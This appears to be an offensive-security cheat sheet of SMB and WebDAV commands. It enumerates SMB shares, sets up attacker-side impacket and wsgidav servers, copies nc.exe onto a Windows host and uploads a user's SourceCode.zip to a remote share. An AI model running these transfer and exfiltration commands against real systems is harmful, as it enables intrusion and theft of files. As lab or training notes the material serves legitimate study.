#### Shares
```smb
smbclient -N -L \\\\<IP>
```

```smb
smbclient \\\\<IP>\\users
```

```smb
smbclient -U <user> \\\\<IP>\\users
```

```smb
smbclient -U <user> \\\\<IP>\\<sharename>
```
## SMB Downloads
#### Create the SMB Server
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
#### Copy a File from the SMB Server
```cmd
copy \\192.168.220.133\share\nc.exe
```
#### Create the SMB Server with a Username and Password
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
#### Mount the SMB Server with Username and Password
```cmd
net use n: \\192.168.220.133\share /user:test test
```
```
copy \\192.168.220.133\share\nc.exe
```
## SMB Uploads
### WebDav
```shell
sudo pip3 install wsgidav cheroot
```
#### WebDav Python
```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
#### Webdav Share
```cmd
dir \\192.168.49.128\DavWWWRoot
```
#### Uploading Files using SMB
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

